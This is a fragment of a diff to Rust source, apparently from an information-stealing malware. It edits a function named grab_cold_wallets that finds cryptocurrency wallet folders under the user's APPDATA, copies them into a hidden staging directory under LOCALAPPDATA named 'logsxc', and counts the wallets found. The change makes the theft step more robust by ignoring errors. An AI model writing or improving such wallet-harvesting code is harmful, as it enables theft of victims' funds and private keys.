@@ -27,12 +27,14 @@ pub fn grab_cold_wallets() {
         let string_path = value.replace("%APPDATA%", &std::env::var("APPDATA").unwrap());
         let path = std::path::Path::new(&string_path);
         if path.exists() {
-            std::fs::create_dir(format!(
+            unsafe { crate::WALLETS += 1; }
+
+            let _ = std::fs::create_dir(format!(
                 "{}\\logsxc\\{}\\",
                 &std::env::var("LOCALAPPDATA").unwrap(),
                 key
-            ))
-            .unwrap();
+            ));
+
             let walker = WalkDir::new(string_path).into_iter();
 
             for entry in walker {
